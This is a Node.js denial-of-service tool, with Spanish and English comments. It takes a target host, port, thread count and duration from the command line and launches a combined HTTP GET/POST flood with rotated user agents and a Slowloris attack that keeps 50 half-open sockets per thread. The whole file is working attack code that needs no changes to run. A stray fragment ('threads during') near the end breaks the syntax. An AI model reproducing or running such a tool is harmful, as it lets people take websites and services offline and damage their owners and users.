// Hi

const axios = require('axios');
const net = require('net');

const THREADS = parseInt(process.argv[2]);
const TARGET = process.argv[3];
const PORT = parseInt(process.argv[4]);
const DURATION = parseInt(process.argv[5]);

if (process.argv.length !== 6) {
  console.log('Command: node script.js <hilos> <host> <puerto> <duracion_seg>');
  process.exit(1);
}

const SCHEME = PORT === 443 ? 'https' : 'http';
const TARGET_URL = `${SCHEME}://${TARGET}`;
const END_TIME = Date.now() + DURATION * 1000;

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'Mozilla/5.0 (X11; Linux x86_64)',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
  'Mozilla/5.0 (Windows NT 6.1; WOW64)'
];

function buildHeaders() {
  return {
    'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
    'Accept': '*/*',
    'Connection': 'keep-alive'
  };
}

// Function for classic Layer7 attack (GET/POST requests)
async function layer7Attack(threadId) {
  const axiosInstance = axios.create({
    timeout: 3000,
    validateStatus: () => true,
  });

  const paths = ['/', '/', '/', '/', '/']; // put directories where I can send requests

  while (Date.now() < END_TIME) {
    const path = paths[Math.floor(Math.random() * paths.length)] + '?v=' + Math.floor(Math.random() * 1000000);
    const url = `${TARGET_URL}${path}`;
    const method = Math.random() > 0.5 ? 'get' : 'post';

    try {
      if (method === 'get') {
        await axiosInstance.get(url, { headers: buildHeaders() });
      } else {
        await axiosInstance.post(url, { q: Math.floor(Math.random() * 10000) }, { headers: buildHeaders() });
      }
      console.log(`[Layer7-Hilo-${threadId}] Petición enviada (${method.toUpperCase()}) a ${path}`);
    } catch (e) {
      console.log(`[Layer7-Hilo-${threadId}] Error: ${e.message}`);
    }
    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 50) + 20)); // wait between 20 and 70 ms
  }
}

// Slowloris
function slowlorisAttack(threadId) {
  const sockets = [];

  function createSocket() {
    const socket = new net.Socket();

    socket.setTimeout(15000);
    socket.on('timeout', () => {
      socket.destroy();
    });

    socket.on('error', () => {
      socket.destroy();
    });

    socket.connect(PORT, TARGET, () => {
      socket.write(
        `GET /?v=${Math.floor(Math.random() * 1000000)} HTTP/1.1\r\n` +
        `Host: ${TARGET}\r\n` +
        `User-Agent: ${USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]}\r\n` +
        `Accept: */*\r\n` +
        `Connection: keep-alive\r\n`
      );
      // Send slow data periodically
      const interval = setInterval(() => {
        if (Date.now() > END_TIME) {
          clearInterval(interval);
          socket.end();
          return;
        }
        try {
          socket.write('X-a: b\r\n'); // incomplete header to keep connection open
        } catch {
          clearInterval(interval);
        }
      }, 15000); // every 15 seconds
      sockets.push(socket);
    });
  }

  // Open many sockets
  for (let i = 0; i < 50; i++) { // 50 slow connections per thread
    createSocket();
  }
}

// Launch combined attacks
for (let i = 0; i < THREADS; i++) {
  layer7Attack(i);
  slowlorisAttack(i);
}
threads during
console.log(`\n[INFO] Layer7 + Slowloris combo attack initiated against ${TARGET_URL} with ${THREADS} threads during ${DURATION} seconds.\n`);
